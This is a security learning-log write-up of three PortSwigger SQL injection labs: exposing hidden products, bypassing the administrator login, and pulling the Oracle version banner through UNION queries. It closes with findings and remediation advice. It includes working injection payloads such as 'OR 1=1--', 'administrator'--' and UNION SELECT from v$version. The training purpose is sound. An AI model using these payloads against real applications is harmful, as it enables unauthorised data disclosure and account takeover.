# SQL Injection — Three Labs, One Chain of Reasoning

**Platform:** PortSwigger Web Security Academy · **Date:** November 2026
**Author:** [Jbali Aloui](https://github.com/aloui-sec)

> Working notes from three SQL injection labs: data disclosure through a filter,
> authentication bypass, and database fingerprinting on Oracle. Payloads and
> reasoning only — the value is the *why*, not the string.

---

## 1. Why SQL injection still matters

SQL injection is not a legacy issue. It survives because applications still build
query strings by concatenating user input, and because the fix — **parameterised
queries** — requires a developer to change how they write every query, not just add
a filter.

The three labs below cover the three questions I ask on any input that reaches a
database:

1. **Does my input change the query's meaning?** (detection)
2. **What can I change it to?** (impact)
3. **What else can I reach from here?** (escalation of the finding)

---

## 2. Lab 1 — Retrieving hidden data via the WHERE clause

**Goal:** display products the application does not intend to show.

The category filter sends `GET /filter?category=Corporate+gifts`. The application
almost certainly builds:

```sql
SELECT * FROM products WHERE category = 'Corporate gifts' AND released = 1
```

The second condition is the business rule hiding unreleased products. Everything
interesting follows from one observation: **my input lands between two quotes, inside
a WHERE clause.**

### Detection

A single quote returned `HTTP/1.1 500 Internal Server Error`. That is the signal:

```sql
WHERE category = 'Corporate gifts'' AND released = 1
                                                  ^ syntax error
```

A syntax error on one quote means unescaped concatenation. The application is not
parameterising.

### Exploitation

SQL comments (`--`) discard the rest of the line:

```
/filter?category=Corporate+gifts'--
```

```sql
WHERE category = 'Corporate gifts'   --' AND released = 1
```

The `released = 1` filter is now a comment. The product list grows: unreleased items
appear.

The stronger form used to confirm it:

```
/filter?category=Corporate+gifts'+OR+1=1--
```

```sql
WHERE category = 'Corporate gifts' OR 1=1   --' AND released = 1
```

`OR 1=1` is unconditionally true, so the condition matches **every row** — not just
the ones in that category. That is the difference between removing one filter and
removing the filter concept entirely.

**Impact:** data disclosure. Any row the query can reach can be returned to the
attacker.

---

## 3. Lab 2 — Authentication bypass

**Goal:** log in as `administrator` without credentials.

The login form issues `POST /login` with `username`, `password` and a CSRF token.
The backend builds:

```sql
SELECT * FROM users WHERE username = 'administrator' AND password = 'x'
```

The entire authentication decision rests on one `AND`. Remove it, and the password is
never checked:

- Username: `administrator'--`
- Password: anything

```sql
SELECT * FROM users WHERE username = 'administrator'   --' AND password = 'x'
```

The application authenticates the row it found — the administrator — and the session
that follows is a full administrator session.

### Two practical notes

**CSRF tokens are session-bound.** A token captured in one session is rejected in the
next (`csrf invalid`). When replaying a request, capture it fresh from the same
session you intend to use. When testing a payload that does not change the request
shape, submitting it through the browser is often cleaner — the browser supplies a
valid token automatically.

**`302` is the success signal here, not `200`.** A login endpoint redirects on
success. Read `Location:` — `/my-account` means authenticated, `/login` means rejected.

**Impact:** full account takeover, and in this case administrative. In a real report
this is **Critical**: `CVSS 9.8 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`.

---

## 4. Lab 3 — Fingerprinting the database (Oracle)

**Goal:** retrieve the database version string.

This lab is where generic payloads stop working, because Oracle differs from MySQL
and PostgreSQL in ways that break otherwise-correct UNION attacks.

### Step 1 — column count

```sql
' ORDER BY 1--     -> 200
' ORDER BY 2--     -> 200
' ORDER BY 3--     -> 500
```

Three fails, two succeeds: the query returns **two columns**. `ORDER BY` is the
cleanest count method — it asks the database to sort by a column index, and errors
when that index does not exist.

### Step 2 — UNION with NULLs

```sql
' UNION SELECT NULL,NULL--            -> 500
' UNION SELECT NULL,NULL FROM dual--  -> 200
```

**This is the Oracle trap.** Oracle requires a `FROM` clause in every `SELECT`.
`dual` is a built-in single-row dummy table that exists for exactly this purpose.
The same payload that works on MySQL returns a 500 on Oracle — and *not* because the
column count is wrong.

A `500` on a UNION attempt has at least three possible causes, and distinguishing
them requires knowing the DBMS:

1. wrong column count,
2. incompatible column types,
3. missing `FROM` (Oracle only).

### Step 3 — extracting the version

`v$version` is an Oracle system view listing component versions; `banner` is the
column holding the full version string.

```
/filter?category=Toys+%26+Games' UNION SELECT banner,NULL FROM v$version--
```

```sql
SELECT * FROM products WHERE category = 'Toys & Games'
UNION SELECT banner, NULL FROM v$version
```

The version banner is rendered where the category name normally appears.

### Reading the result carefully

The response also contains the lab's own description text, which mentions the same
version string. Two matches for `Oracle Database 11g` in one response: one is page
copy in `<p id="hint">`, the other is **my data** inside a table cell. In a real
engagement, confusing application text with extracted data produces false findings —
always check the HTML context of the match.

**Impact:** database and version disclosure. On its own, informational — but it tells
an attacker which DBMS-specific syntax, system tables and known CVEs to use next. It
is the reconnaissance that makes the previous two labs repeatable.

---

## 5. Findings

| # | Finding | Severity |
|---|---------|----------|
| 1 | SQL injection in the category filter allows retrieval of hidden records | High |
| 2 | SQL injection in the login form allows authentication bypass to an administrative account | Critical |
| 3 | SQL injection allows UNION-based extraction of arbitrary query results, including system views | High |
| 4 | Database type and version disclosed through injection | Medium |
| 5 | Unescaped `'` returns a 500 error — verbose error disclosure confirms the injection | Low |

---

## 6. Remediation

1. **Use parameterised queries (prepared statements) everywhere.** This is the fix.
   Not escaping, not filtering, not a WAF — parameterisation separates code from data
   so the input can never become syntax.
2. **Apply least privilege to the database account.** The application's DB user should
   not be able to read system views, other schemas, or write where it does not need
   to. This limits the blast radius of any injection that still exists.
3. **Suppress detailed database errors.** Generic error pages remove the fastest
   detection signal and stop version leakage.
4. **Never build authentication decisions from a single query with an `AND`.** Use
   prepared statements, and verify the password hash comparison in application code.
5. **Treat a WAF as damage reduction, never as a fix.** The underlying query is still
   injectable.
6. **Log and alert on SQL error patterns** — a spike in syntax errors on one parameter
   is a reliable injection signal.

---

## 7. Lessons

1. **A single quote is the whole first test.** `200` means "maybe"; a `500` means "the
   input reached the parser".
2. **Comments remove business logic, not just quotes.** `--` deleted an authorization
   filter as easily as a syntax fragment.
3. **`OR 1=1` is not a party trick.** It is the smallest demonstration that the WHERE
   clause no longer constrains anything.
4. **Know the DBMS before building a payload.** Oracle's mandatory `FROM` turned a
   correct UNION into a 500, and the error message said nothing useful about why.
5. **`ORDER BY` is a cleaner column counter than trial-and-error with NULLs.**
6. **Read the response body, not just the status code.** My extracted data and the
   application's own hint text looked identical until I checked the HTML context.
7. **Tokens and sessions are bound together.** A stale CSRF token invalidates an
   otherwise perfect request and looks like a failed exploit.

---

## 8. References

- PortSwigger — [SQL injection](https://portswigger.net/web-security/sql-injection)
- PortSwigger — [Examining the database](https://portswigger.net/web-security/sql-injection/examining-the-database)
- OWASP — SQL Injection Prevention Cheat Sheet

---

<sub>Published as part of a public learning log. All labs were performed on
PortSwigger's intentionally vulnerable training environments.</sub>
